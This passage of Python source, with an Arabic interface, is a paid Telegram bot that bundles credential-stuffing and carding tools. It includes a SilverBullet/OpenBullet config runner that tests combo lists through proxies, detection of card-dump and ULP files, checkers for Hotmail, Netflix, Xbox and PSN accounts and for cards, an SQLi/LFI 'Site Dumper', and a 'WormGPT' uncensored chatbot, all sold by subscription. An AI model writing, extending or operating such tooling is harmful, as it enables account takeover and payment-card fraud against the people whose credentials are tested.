            f"║  🔁 إعادة   │ <b>{self.retries:,}</b>\n"
            f"╠══════════════════════════════╣\n"
            f"║  📊 مجموع  │ <b>{self.checked:,}/{self.total:,}</b>\n"
            f"║  ⚡ CPM     │ <b>{avg_cpm:,}</b>\n"
            f"║  ⏱️ وقت    │ {el_str}\n"
            f"╚══════════════════════════════╝\n"
            f"💎 {MY_SIGNATURE}"
        )
        send_message(self.bot_token, self.chat_id, summary)

        if self.hits > 0 and os.path.exists(self._results_file):
            send_document(
                self.bot_token, self.chat_id, self._results_file,
                caption=(f"🎯 <b>SilverBullet Hits</b> — {esc(self.config.get('name',''))}\n"
                         f"✅ {self.hits} هيت من {self.checked:,} فحص\n"
                         f"💎 {MY_SIGNATURE}"))


# ── Menu ──────────────────────────────────────────────────────────────────────

def get_silverbullet_menu(chat_id):
    cid      = str(chat_id)
    configs  = _sb_configs.get(cid, [])
    proxies  = _sb_proxies.get(cid, [])
    settings = _sb_settings.get(cid, {})
    n_cfg    = len(configs)
    n_prx    = len(proxies)
    threads  = settings.get("threads", 50)
    running  = cid in _sb_sessions

    # Config preview
    if configs:
        c = configs[-1]["config"]
        tgt = c.get("requests", [{}])[0].get("url", "?")
        steps = len(c.get("requests", []))
        cfg_preview = (
            f"📋 <b>آخر كونفيغ:</b> {esc(configs[-1]['name'])}\n"
            f"🌐 <code>{esc(tgt[:40])}</code>\n"
            f"🔢 خطوات: {steps}\n"
        )
    else:
        cfg_preview = "📋 <i>لا يوجد كونفيغ — ارفع ملف .json</i>\n"

    status_line = (
        f"🟢 <b>جارٍ الفحص الآن!</b>" if running else
        f"⚪ <b>جاهز للفحص</b>"
    )

    text = (
        f"🔵 <b>SilverBullet / OpenBullet Engine v2</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{status_line}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{cfg_preview}"
        f"🌐 البروكسيات : <b>{n_prx:,}</b>\n"
        f"⚡ الثريدات   : <b>{threads}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📖 <b>طريقة الاستخدام:</b>\n"
        f"1️⃣ ارفع كونفيغ <b>.json</b>\n"
        f"2️⃣ ارفع بروكسيات <b>.txt</b> (اختياري)\n"
        f"3️⃣ اضبط عدد الثريدات\n"
        f"4️⃣ ابدأ الفحص وارفع الكومبو\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📌 <b>صيغة الكونفيغ:</b>\n"
        f'<code>{{"name":"Netflix","proxy_type":"http",\n'
        f'"requests":[{{"url":"https://site/login",\n'
        f'"method":"POST","content_type":"application/json",\n'
        f'"body":"{{\\"email\\":\\"&lt;USER&gt;\\",\\"password\\":\\"&lt;PASS&gt;\\"}}",\n'
        f'"success_keys":["dashboard"],"fail_keys":["invalid"],\n'
        f'"ban_keys":["captcha"],"captures":[{{"name":"plan","regex":"plan.*?"}}]}}]}}</code>'
    )

    # Thread selector row
    th_btns = []
    for t in [10, 25, 50, 100, 150, 200]:
        mark = "✅" if threads == t else ""
        th_btns.append({"text": f"{mark}{t}", "callback_data": f"sb_threads_{t}"})

    # Proxy status line
    prx_meta = _sb_settings.get(cid, {})
    n_live = prx_meta.get("last_live", None)
    prx_line = (f"🌐 البروكسيات : <b>{n_prx:,}</b>"
                + (f" (✅ {n_live:,} حي)" if n_live is not None else ""))

    buttons = [
        [{"text": f"📂 الكونفيغات ({n_cfg})", "callback_data": "sb_list_configs"},
         {"text": f"🌐 البروكسيات ({n_prx:,})", "callback_data": "sb_list_proxies"}],
        [{"text": "🗑️ مسح الكونفيغات",  "callback_data": "sb_clear_configs"},
         {"text": "🗑️ مسح البروكسيات", "callback_data": "sb_clear_proxies"}],
    ]
    if n_prx > 0:
        buttons.append([{"text": "🔍 فحص البروكسيات (إزالة الميتة)",
                         "callback_data": "sb_test_proxies"}])
    buttons.append(th_btns)
    if running:
        buttons.append([
            {"text": "⏸️ إيقاف مؤقت", "callback_data": "sb_pause"},
            {"text": "🛑 إيقاف",       "callback_data": "stop_scan"},
        ])
    else:
        buttons.append([{"text": "▶️ ابدأ الفحص — ارفع الكومبو",
                         "callback_data": "sb_start_check"}])
    buttons.append([{"text": "📖 مثال كونفيغ", "callback_data": "sb_show_example"},
                    {"text": "🔙 رجوع",        "callback_data": "menu_main"}])
    return text, {"inline_keyboard": buttons}


# ══════════════════════════════════════════════════════════════════════════════
# FILE FORMAT DETECTION
# ══════════════════════════════════════════════════════════════════════════════

def detect_file_format(lines):
    """Returns (fmt, label). fmt: 'combo','ulp','url','card'"""
    if not lines:
        return 'combo', 'غير معروف'
    sample = [l for l in lines[:20] if l.strip()]
    url_count = sum(1 for l in sample if l.startswith("http"))
    card_count= sum(1 for l in sample if re.match(r'^\d{13,19}[\|]', l))
    ulp_count = sum(1 for l in sample if l.startswith("http") and l.count(':') >= 2)
    if ulp_count >= len(sample)//2:
        return 'ulp', 'ULP (URL:Login:Pass)'
    if card_count >= len(sample)//2:
        return 'card', 'بطاقات (CC|MM|YY|CVV)'
    if url_count >= len(sample)//2:
        return 'url', 'روابط URLs'
    return 'combo', 'كومبو (Email:Pass)'


# ══════════════════════════════════════════════════════════════════════════════
# MENUS
# ══════════════════════════════════════════════════════════════════════════════

def get_welcome_menu(user_id, user_first):
    roles = ok(user_id)
    role_name = (
        "👑 مالك البوت (Owner)" if "OWNER" in roles else
        "🔑 مشرف (Admin)"      if "ADMIN" in roles else
        "⭐ عضو مميز (Premium)" if "PAID"  in roles else
        "👤 عضو عادي (Free)"
    )
    data = load_data()
    payments = data.get("payments",{})
    uid = str(user_id)
    expire_info = "دائم (Lifetime)"
    if uid in payments:
        exp = payments[uid].get("expire_at",0)
        if exp > time.time():
            left = int(exp - time.time())
            d,h  = left // 86400, (left % 86400) // 3600
            expire_info = f"{d}d {h}h متبقي"
        else:
            expire_info = "❌ منتهي"
    welcome_text = (
        f"⚜️ <b>MULTI-TOOL MASTER BOT</b> ⚜️\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 مرحباً <a href='tg://user?id={user_id}'>{esc(user_first)}</a>!\n"
        f"👤 <b>رتبتك:</b> {role_name}\n"
        f"📅 <b>الاشتراك:</b> <code>{expire_info}</code>\n"
        f"📡 <b>القناة:</b> {TELEGRAM_CHANNEL}\n"
        f"👑 <b>المطور:</b> {OWNER_NAME}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👇 اختر من القائمة:"
    )
    buttons = [
        [{"text": "⚜️ بوابات الفحص | Gates ⚜️",         "callback_data": "menu_gates"}],
        [{"text": "🛠️ أدوات متقدمة | Tools 🛠️",          "callback_data": "menu_tools"}],
        [{"text": "🔵 SilverBullet Engine 🔵",            "callback_data": "menu_silverbullet"}],
        [{"text": "💳 اشترك / شراء | Subscribe 💳",      "callback_data": "menu_subscribe"}],
        [{"text": "🔑 تفعيل كود | Activate Code 🔑",     "callback_data": "menu_activate"}],
        [{"text": "ℹ️ شرح البوت | Bot Info ℹ️",          "callback_data": "menu_info"}],
    ]
    if "ADMIN" in roles or "OWNER" in roles:
        buttons.append([{"text": "👑 لوحة التحكم | Admin Panel 👑", "callback_data": "menu_admin"}])
    buttons.append([{"text": "📡 قناة المطور | Channel 📡", "url": TELEGRAM_CHANNEL}])
    return welcome_text, {"inline_keyboard": buttons}

def get_gates_menu():
    text = (
        f"⚜️ <b>بوابات الفحص | Available Gates</b> ⚜️\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📩 Hotmail Scanner — 4 أوضاع فحص\n"
        f"🎬 Netflix Checker — Playwright\n"
        f"🧠 WormGPT AI — ذكاء اصطناعي\n"
        f"🌐 Site Dumper — SQLi/LFI/Redirect\n"
        f"💳 Claude Card Checker\n"
        f"🎮 Xbox/Microsoft V6 — Payment API\n"
        f"🕹️ PSN Full Capture — Online ID\n"
        f"☁️ Boosteroid Cloud Gaming\n"
        f"🎯 PSN Sony Rewards\n"
        f"🔱 PSN Ultra Legend — الفاحص الأسطوري\n"
        f"📬 Inboxer — كلمات مفتاحية لكل الدومينات\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👇 اختر البوابة:"
    )
    buttons = [
        [{"text": "📩 فحص هوتميل | Hotmail Scanner",     "callback_data": "gate_hotmail"}],
        [{"text": "🎬 فحص نيتفليكس | Netflix Checker",   "callback_data": "gate_netflix"}],
        [{"text": "🧠 WormGPT AI | ذكاء اصطناعي",        "callback_data": "gate_wormgpt"}],
        [{"text": "🌐 فحص مواقع | Site Dumper",           "callback_data": "gate_dumper"}],
        [{"text": "💳 بطاقات كلود | Claude Checker",      "callback_data": "gate_claude"}],
        [{"text": "🎮 فحص Xbox/Microsoft | Xbox Checker", "callback_data": "gate_xbox"}],
        [{"text": "🕹️ PSN Full Capture",                  "callback_data": "gate_psn"}],
        [{"text": "☁️ Boosteroid Cloud Gaming",           "callback_data": "gate_boosteroid"}],
        [{"text": "🎯 PSN Sony Rewards",                  "callback_data": "gate_psnsony"}],
        [{"text": "🔱 PSN Ultra Legend ⚡ الأسطوري",      "callback_data": "gate_psn_legend"}],
        [{"text": "📬 Inboxer — كلمات مفتاحية",          "callback_data": "gate_inboxer"}],
        [{"text": "🔙 رجوع | Back",                       "callback_data": "menu_main"}],
    ]
    return text, {"inline_keyboard": buttons}

def get_tools_menu():
    text = (
        f"🛠️ <b>أدوات متقدمة | Advanced Tools</b> 🛠️\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 ULP Extractor — استخراج كومبو\n"
        f"🔢 ULP Sorter — فرز حسب الدومين\n"
        f"📬 SMTP Checker — بريد صالح\n"
        f"📬 IMAP Checker — 100+ دومين\n"
        f"🌐 PlainProxy — فحص بروكسي\n"
        f"🖥️ VPS Checker — my-vps.services\n"
        f"🎲 1xbet Checker\n"
        f"🖥️ BlackRDP Checker\n"
        f"🎮 Xbox Full Capture\n"
        f"🎮 PSN Checker v3\n"
        f"🔱 PSN Ultra Legend ⚡ — الفاحص الأسطوري\n"
        f"📬 Inboxer — كلمات مفتاحية لكل الدومينات\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⬆️ ارفع ملف .txt لبدء الفحص:"
    )
    buttons = [
        [{"text": "🔙 رجوع | Back", "callback_data": "menu_main"}]
    ]
    return text, {"inline_keyboard": buttons}

def get_subscribe_menu():
    text = (
        f"💳 <b>الاشتراك والدفع | Subscription</b> 💳\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ <b>1 ساعة</b>   — 100 ⭐ ($2)\n"
        f"📅 <b>7 أيام</b>   — 400 ⭐ ($8)\n"
        f"🌟 <b>30 يوم</b>   — 750 ⭐ ($15)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"الدفع بنجوم Telegram (Stars) ⭐\n"
        f"👇 اختر خطة الاشتراك:"
    )
    buttons = [
        [{"text": "⚡ 1 ساعة — 100 ⭐", "callback_data": "buy_1h"}],
        [{"text": "📅 7 أيام — 400 ⭐", "callback_data": "buy_7d"}],
        [{"text": "🌟 30 يوم — 750 ⭐", "callback_data": "buy_30d"}],
        [{"text": "🔙 رجوع", "callback_data": "menu_main"}],
    ]
    return text, {"inline_keyboard": buttons}

def get_admin_menu(user_id):
    users     = get_cloud_list("users")
    premium   = get_cloud_list("paid")
    admins    = get_cloud_list("admins")
    groups    = get_cloud_list("group")
    blacklist = get_cloud_list("black_users")
    text = (
        f"👑 <b>لوحة التحكم | Admin Panel</b> 👑\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 المستخدمون: <code>{len(users)}</code>\n"
        f"⭐ المميزون: <code>{len(premium)}</code>\n"
        f"🔑 الأدمنة: <code>{len(admins)}</code>\n"
        f"👥 المجموعات: <code>{len(groups)}</code>\n"
        f"🚫 المحظورون: <code>{len(blacklist)}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👇 اختر الإجراء:"
    )
    buttons = [
        [{"text": "📊 تحديث","callback_data":"admin_refresh"},
         {"text": "📢 إذاعة","callback_data":"admin_broadcast"}],
        [{"text": "➕ إضافة مميز","callback_data":"admin_add_premium"},
         {"text": "➖ حذف مميز","callback_data":"admin_remove_premium"}],
        [{"text": "🔑 إضافة أدمن","callback_data":"admin_add_admin"},
         {"text": "❌ حذف أدمن","callback_data":"admin_remove_admin"}],
        [{"text": "🚫 حظر عضو","callback_data":"admin_blacklist"},
         {"text": "🟢 إلغاء حظر","callback_data":"admin_unblacklist"}],
        [{"text": "🎟️ إنشاء كود تفعيل","callback_data":"admin_gen_code"}],
        [{"text": "🔙 رجوع","callback_data":"menu_main"}],
    ]
    return text, {"inline_keyboard": buttons}

def get_hotmail_mode_menu():
    text = (
        f"📩 <b>Hotmail Scanner — اختر وضع الفحص</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"1️⃣ <b>General Scan</b> — فحص عام للحساب\n"
        f"2️⃣ <b>PSN Detailed</b> — إيميلات PlayStation\n"
        f"3️⃣ <b>Custom Domain</b> — إيميلات دومين محدد\n"
        f"4️⃣ <b>Roblox Link Scan</b> — ربط Roblox\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"الصيغة: <code>email:password</code>"
    )
    buttons = [
        [{"text": "1️⃣ General Scan",     "callback_data": "hotmail_mode_1"}],
        [{"text": "2️⃣ PSN Detailed",     "callback_data": "hotmail_mode_2"}],
        [{"text": "3️⃣ Custom Domain",    "callback_data": "hotmail_mode_3"}],
        [{"text": "4️⃣ Roblox Link Scan", "callback_data": "hotmail_mode_4"}],
        [{"text": "🔙 رجوع",              "callback_data": "menu_gates"}],
    ]
    return text, {"inline_keyboard": buttons}


# ══════════════════════════════════════════════════════════════════════════════
# MAIN BOT CLASS
# ══════════════════════════════════════════════════════════════════════════════

class MasterBot:
    def __init__(self, token):
        self.token   = token
        self.offset  = 0
        self.wormgpt = WormGPTUltimate()
        self.running_scans: dict = {}  # chat_id -> scanner instance

    # ── Registration helper ──────────────────────────────────────────────────

    def on_scan_complete(self, chat_id):
        cid = int(chat_id) if str(chat_id).lstrip('-').isdigit() else chat_id
        self.running_scans.pop(str(cid), None)
        self.running_scans.pop(cid, None)
        clear_scan_state(cid)

    # ── File download ────────────────────────────────────────────────────────

    def download_file(self, file_id, save_path):
        ok_, err = download_file(self.token, file_id, save_path)
        return ok_, err

    # ── Handle /start and text messages ─────────────────────────────────────

    def handle_message(self, msg):
        chat_id   = msg["chat"]["id"]
        chat_type = msg["chat"].get("type","private")
        user      = msg.get("from",{})
        user_id   = user.get("id")
        user_first= user.get("first_name","User")
        text      = msg.get("text","").strip()
        session   = sess(chat_id)

        register_user(user_id)
        if chat_type in ("group","supergroup"):
            register_group(chat_id)

        authorized, err_msg = check_chat_and_user_authorization(chat_id, user_id, chat_type)
        if not authorized:
            send_message(self.token, chat_id, err_msg)
            return

        # ── Admin state machine ──────────────────────────────────────────────
        waiting = session.get("waiting_admin")
        if waiting:
            roles = ok(user_id)
            if "ADMIN" not in roles and "OWNER" not in roles:
                session["waiting_admin"] = None
                send_message(self.token, chat_id, "❌ لا تمتلك صلاحية!")
                return
            session["waiting_admin"] = None

            if waiting == "broadcast":
                run_broadcast(self.token, chat_id, text)
                return
            elif waiting == "add_premium":
                uid = text.strip()
                if not uid.isdigit():
                    send_message(self.token, chat_id, "❌ آيدي غير صحيح!")
                    return
                paid = get_cloud_list("paid")
                if uid not in paid:
                    paid.append(uid)
                    save_cloud_list("paid", paid)
                send_message(self.token, chat_id, f"✅ تمت إضافة <code>{uid}</code> كمشترك مميز!")
                return
            elif waiting == "remove_premium":
                uid = text.strip()
                paid = get_cloud_list("paid")
                if uid in paid:
                    paid.remove(uid)
                    save_cloud_list("paid", paid)
                send_message(self.token, chat_id, f"✅ تمت إزالة <code>{uid}</code>!")
                return
            elif waiting == "add_admin":
                uid = text.strip()
                if not uid.isdigit():
                    send_message(self.token, chat_id, "❌ آيدي غير صحيح!")
                    return
                admins = get_cloud_list("admins")
                if uid not in admins:
                    admins.append(uid)
                    save_cloud_list("admins", admins)
                send_message(self.token, chat_id, f"✅ تمت إضافة <code>{uid}</code> كأدمن!")
                return
            elif waiting == "remove_admin":
                uid = text.strip()
                admins = get_cloud_list("admins")
                if uid in admins:
                    admins.remove(uid)
                    save_cloud_list("admins", admins)
                send_message(self.token, chat_id, f"✅ تمت إزالة أدمن <code>{uid}</code>!")
                return
            elif waiting == "blacklist":
                uid = text.strip()
                bl = get_cloud_list("black_users")
                if uid not in bl:
                    bl.append(uid)
                    save_cloud_list("black_users", bl)
                send_message(self.token, chat_id, f"🚫 تم حظر <code>{uid}</code>!")
                return
            elif waiting == "unblacklist":
                uid = text.strip()
                bl = get_cloud_list("black_users")
                if uid in bl:
                    bl.remove(uid)
                    save_cloud_list("black_users", bl)
                send_message(self.token, chat_id, f"🟢 تم إلغاء حظر <code>{uid}</code>!")
                return
            elif waiting == "gen_code":
                plan_key = text.strip().lower()
                if plan_key not in PAYMENT_PLANS:
                    send_message(self.token, chat_id,
                        f"❌ خطة غير صحيحة! الخطط المتاحة: {', '.join(PAYMENT_PLANS)}")
                    return
                code = generate_activation_code(plan_key)
                plan = PAYMENT_PLANS[plan_key]
                send_message(self.token, chat_id,
                    f"✅ <b>تم إنشاء كود التفعيل!</b>\n\n"
                    f"🎟️ الكود: <code>{code}</code>\n"
                    f"📦 الخطة: {plan['label']}\n"
                    f"⚡ الصلاحية: {plan['label']}")
                return
            elif waiting == "activate_code":
                code = text.strip().upper()
                ok_v, msg_or_plan = use_activation_code(code, str(user_id))
                if ok_v:
                    send_message(self.token, chat_id,
                        f"✅ <b>تم تفعيل اشتراكك بنجاح!</b>\n"
                        f"📦 الخطة: {msg_or_plan}\n"
                        f"💎 استمتع بجميع المميزات!")
                else:
                    send_message(self.token, chat_id, msg_or_plan)
                return
            elif waiting == "inboxer_keywords":
                raw = text.strip()
                # تحليل الكلمات المفصولة بفاصلة
                kws = [k.strip() for k in re.split(r'[،,\n]+', raw) if k.strip()]
                if not kws:
                    send_message(self.token, chat_id,
                        "❌ لم يُدخَل أي كلمة! أعد الإرسال:")
                    session["waiting_admin"] = "inboxer_keywords"
                    return
                lines = session.get("pending_file_lines", [])
                if not lines:
                    send_message(self.token, chat_id,
                        "❌ لا يوجد ملف محمّل! أرفع ملف الكومبو أولاً.")
                    return
                kw_preview = ", ".join(kws[:5])
                send_message(self.token, chat_id,
                    f"📬 <b>Inboxer — كلمات مخصصة</b>\n"
                    f"🔑 {len(kws)} كلمة: <code>{esc(kw_preview)}</code>\n"
                    f"📋 {len(lines):,} حساب\n⏳ جارٍ التشغيل...")
                reset_stop_event(int(chat_id) if isinstance(chat_id, str) else chat_id)
                threading.Thread(
                    target=run_inboxer_checker,
                    args=(self.token, chat_id, lines, kws),
                    daemon=True
                ).start()
                return
            elif waiting == "hotmail_custom_domain":
                domain = text.strip()
                session["custom_domain"] = domain
                session["state"] = "hotmail_waiting_file"
                send_message(self.token, chat_id,
                    f"✅ <b>الدومين: <code>{esc(domain)}</code></b>\n"
                    f"الآن أرسل ملف .txt بالكومبو (email:password):")
                return
            elif waiting == "wormgpt_question":
                session["waiting_admin"] = None
                session["interactive_wormgpt"] = True
                send_message(self.token, chat_id, "🧠 <b>WormGPT مفعّل!</b> اكتب سؤالك الآن.")
                return

        # ── WormGPT interactive mode ─────────────────────────────────────────
        if session.get("interactive_wormgpt") and text:
            send_message(self.token, chat_id, "⏳ <b>WormGPT يعالج سؤالك...</b>")
            def ask_wormgpt():
                answer = self.wormgpt.ask(text)
                send_message(self.token, chat_id, f"🧠 <b>WormGPT:</b>\n\n{answer}")
            threading.Thread(target=ask_wormgpt, daemon=True).start()
            return

        # ── /start ───────────────────────────────────────────────────────────
        if text in ("/start", "!start", ".start"):
            wt, wm = get_welcome_menu(user_id, user_first)
            try:
                send_message(self.token, chat_id,
                    f"🎬 <b>فيديو ترحيبي:</b> {WELCOME_VIDEO_URL}")
            except Exception:
                pass
            send_message(self.token, chat_id, wt, reply_markup=wm)
            return

        # ── Admin shortcut commands ───────────────────────────────────────────
        roles = ok(user_id)
        if ("ADMIN" in roles or "OWNER" in roles) and text:
            lower = text.lower()
            if lower.startswith("/addpremium ") or lower.startswith("!addpremium "):
                uid = text.split(None,1)[1].strip()
                if uid.isdigit():
                    paid = get_cloud_list("paid")
                    if uid not in paid:
                        paid.append(uid)
                        save_cloud_list("paid", paid)
                    send_message(self.token, chat_id, f"✅ تمت إضافة <code>{uid}</code>!")
                return
            if lower.startswith("/ban ") or lower.startswith("!ban "):
                uid = text.split(None,1)[1].strip()
                bl = get_cloud_list("black_users")
                if uid not in bl:
                    bl.append(uid)
                    save_cloud_list("black_users", bl)
                send_message(self.token, chat_id, f"🚫 تم حظر <code>{uid}</code>!")
                return

        # ── Default: show main menu for any other text ─────────────────────
        wt, wm = get_welcome_menu(user_id, user_first)
        send_message(self.token, chat_id, wt, reply_markup=wm)

    # ── Handle documents (combo files) ───────────────────────────────────────

    def handle_document(self, msg):
        chat_id   = msg["chat"]["id"]
        chat_type = msg["chat"].get("type", "private")
        user_id   = msg.get("from",{}).get("id")
        document  = msg.get("document",{})
        file_name = document.get("file_name","file.txt")
        file_id   = document.get("file_id","")
        file_size = document.get("file_size", 0)
        session   = sess(chat_id)

        authorized, err_msg = check_chat_and_user_authorization(chat_id, user_id, chat_type)
        if not authorized:
            send_message(self.token, chat_id, err_msg)
            return

        # Check permissions
        roles = ok(user_id)
        if "OWNER" not in roles and "ADMIN" not in roles and "PAID" not in roles:
            send_message(self.token, chat_id,
                "⭐ <b>هذه الميزة للمشتركين المميزين فقط!</b>\n"
                "💳 استخدم زر الاشتراك لمعرفة الخطط المتاحة.")
            return

        # Check file type — accept .txt and .json (for SilverBullet configs)
        fname_lower = file_name.lower()
        if not (fname_lower.endswith(".txt") or fname_lower.endswith(".json")):
            send_message(self.token, chat_id,
                "❌ <b>صيغة الملف غير مدعومة!</b>\n"
                "📄 المقبول: <b>.txt</b> للكومبو والبروكسيات\n"
                "📋 المقبول: <b>.json</b> لكونفيغات SilverBullet")
            return

        # Check file size (max 20MB Telegram limit)
        if file_size and file_size > 20 * 1024 * 1024:
            size_mb = file_size / (1024 * 1024)
            send_message(self.token, chat_id,
                f"❌ <b>الملف كبير جداً!</b>\n"
                f"📦 الحجم: <code>{size_mb:.1f} MB</code>\n"
                f"⚠️ الحد الأقصى: <b>20 MB</b>")
            return

        # Notify user & download
        prog_mid = _send_msg_id(self.token, chat_id,
            f"⏳ <b>جارٍ تحميل الملف...</b>\n"
            f"📄 <code>{esc(file_name)}</code>"
            + (f"\n📦 الحجم: <code>{file_size/1024:.1f} KB</code>" if file_size else ""))

        _ul_dir = "uploads"
        os.makedirs(_ul_dir, exist_ok=True)
        save_path = f"{_ul_dir}/upload_{chat_id}_{int(time.time())}.txt"
        success, dl_err = self.download_file(file_id, save_path)

        if not success:
            err_detail = f"\n\n🔍 <b>السبب:</b> <code>{esc(dl_err)}</code>" if dl_err else ""
            edit_message(self.token, chat_id, prog_mid,
                f"❌ <b>تعذّر تحميل الملف!</b>{err_detail}\n\n"
                "💡 <b>حلول مقترحة:</b>\n"
                "• أعد إرسال الملف مرة أخرى\n"
                "• تأكد أن الملف أقل من 20 MB\n"
                "• جرب ملفاً مختلفاً\n"
                "• إذا تكرر الخطأ أوقف البوت وأعد تشغيله",
                reply_markup={"inline_keyboard": [
                    [{"text": "🔄 حاول مجدداً", "callback_data": "menu_main"}]
                ]})
            return

        # Read lines — try multiple encodings
        lines = []
        for enc in ("utf-8", "utf-8-sig", "latin-1", "cp1252"):
            try:
                with open(save_path, "r", encoding=enc, errors="ignore") as f:
                    lines = [l.rstrip('\n\r') for l in f if l.strip()]
                if lines:
                    break
            except Exception:
                continue

        # Cleanup temp file
        try:
            os.remove(save_path)
        except Exception:
            pass

        if not lines:
            edit_message(self.token, chat_id, prog_mid,
                "❌ <b>الملف فارغ أو لا يحتوي على بيانات!</b>\n"
                "📝 تأكد أن الملف يحتوي على بيانات صالحة.")
            return

        # ── SilverBullet: JSON config file ──────────────────────────────────
        if fname_lower.endswith(".json"):
            raw_text = "\n".join(lines)
            cfg, err = _sb_parse_config(raw_text)
            if err:
                edit_message(self.token, chat_id, prog_mid,
                    f"❌ <b>كونفيغ SilverBullet غير صالح!</b>\n{err}\n\n"
                    f"📋 تأكد أن الملف يحتوي على الحقول المطلوبة:\n"
                    f"<code>target</code> و <code>success_keys</code>")
                return
            cid_str = str(chat_id)
            if cid_str not in _sb_configs:
                _sb_configs[cid_str] = []
            _sb_configs[cid_str].append({"name": cfg.get("name","Config"), "config": cfg})
            n_cfg = len(_sb_configs[cid_str])
            edit_message(self.token, chat_id, prog_mid,
                f"✅ <b>تم حفظ الكونفيغ!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 الاسم  : <b>{esc(cfg.get('name',''))}</b>\n"
                f"🎯 الهدف  : <code>{esc(cfg.get('requests',[{}])[0].get('url','')[:45])}</code>\n"
                f"🔑 هيت   : {', '.join(cfg.get('success_keys',[])[:3])}\n"
                f"📂 المحفوظ: <b>{n_cfg}</b> كونفيغ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💡 الآن أرفع ملف البروكسيات (.txt) أو ابدأ الفحص مباشرة.",
                reply_markup={"inline_keyboard": [
                    [{"text": "🔵 فتح SilverBullet Engine", "callback_data": "menu_silverbullet"}],
                    [{"text": "🔙 القائمة الرئيسية",        "callback_data": "menu_main"}],
                ]})
            return

        # ── SilverBullet: Proxy file detection ──────────────────────────────
        proxy_patterns = re.compile(
            r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}|'
            r'socks[45]?://|http://|https://)', re.IGNORECASE)
        is_proxy_file = (session.get("expecting_sb_proxies", False) or
                         (len(lines) >= 3 and
                          sum(1 for l in lines[:20] if proxy_patterns.match(l.strip())) >= min(3, len(lines))))
        if is_proxy_file and not session.get("expecting_sb_combo", False):
            session.pop("expecting_sb_proxies", None)
            _sb_proxies[str(chat_id)] = lines
            edit_message(self.token, chat_id, prog_mid,
                f"🌐 <b>تم حفظ البروكسيات!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 العدد : <b>{len(lines):,}</b> بروكسي\n"
                f"🔍 مثال : <code>{esc(lines[0][:40])}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💡 الآن أرفع ملف الكومبو (.txt) لبدء الفحص.",
                reply_markup={"inline_keyboard": [
                    [{"text": "🔵 فتح SilverBullet Engine", "callback_data": "menu_silverbullet"}],
                    [{"text": "🔙 القائمة الرئيسية",        "callback_data": "menu_main"}],
                ]})
            return

        count = len(lines)
        fmt, fmt_label = detect_file_format(lines)

        # ── SilverBullet: Combo file when engine is active ──────────────────
        cid_str = str(chat_id)
        if session.get("expecting_sb_combo", False):
            session.pop("expecting_sb_combo", None)
            configs_list = _sb_configs.get(cid_str, [])
            if not configs_list:
                edit_message(self.token, chat_id, prog_mid,
                    "❌ <b>لا يوجد كونفيغ SilverBullet محفوظ!</b>\n"
                    "📋 ارفع ملف الكونفيغ (.json) أولاً.")
                return

            # If only one config, run it; if multiple, let user pick
            if len(configs_list) == 1:
                # Run the single config
                cfg      = configs_list[0]["config"]
                proxies  = _sb_proxies.get(cid_str, [])
                settings = _sb_settings.get(cid_str, {})
                threads  = settings.get("threads", int(cfg.get("threads", 50)))
                edit_message(self.token, chat_id, prog_mid,
                    f"╔══════════════════════════════╗\n"
                    f"║  🚀 <b>SilverBullet — جارٍ البدء</b>  ║\n"
                    f"╠══════════════════════════════╣\n"
                    f"║  📋 {esc(cfg.get('name','')[:26])}\n"
                    f"║  🔢 خطوات: {len(cfg.get('requests',[]))}\n"
                    f"║  📊 كومبو : {count:,}\n"
                    f"║  ⚡ ثريد  : {threads}\n"
                    f"║  🌐 بروكسي: {len(proxies):,}\n"
                    f"╚══════════════════════════════╝")
                runner = SilverBulletRunner(
                    chat_id=chat_id, bot_token=self.token, config=cfg,
                    combo_lines=lines, proxies=proxies,
                    progress_msg_id=prog_mid, threads=threads)
                runner.start_scan()
                return
            else:
                # Multiple configs — store combo and let user pick config
                session["sb_pending_combo"] = lines
                kb = [[{"text": f"📋 {c['name']}", "callback_data": f"sb_run_{i}"}]
                      for i, c in enumerate(configs_list)]
                kb.append([{"text": "🔙 رجوع", "callback_data": "menu_silverbullet"}])
                edit_message(self.token, chat_id, prog_mid,
                    f"✅ الكومبو جاهز ({count:,} سطر)\n"
                    f"اختر الكونفيغ للفحص:",
                    reply_markup={"inline_keyboard": kb})
                return

        # Store lines in session
        session["pending_file_lines"] = lines
        session["pending_file_fmt"]   = fmt

        # Determine available actions based on format
        buttons = []
        if fmt == 'combo':
            buttons = [
                [{"text": "📩 Hotmail Scanner",        "callback_data": "file_hotmail"}],
                [{"text": "🎬 Netflix Checker",         "callback_data": "file_netflix"}],
                [{"text": "💳 Claude Card Checker",     "callback_data": "file_claude"}],
                [{"text": "🎮 Xbox V6 (Class Checker)", "callback_data": "file_xbox_class"}],
                [{"text": "🎮 Xbox Full Capture (Tool)","callback_data": "file_xbox_tool"}],
                [{"text": "🕹️ PSN Capture",            "callback_data": "file_psn_class"}],
                [{"text": "🎮 PSN Checker v3 (Tool)",   "callback_data": "file_psn_tool"}],
                [{"text": "☁️ Boosteroid",             "callback_data": "file_boosteroid"}],
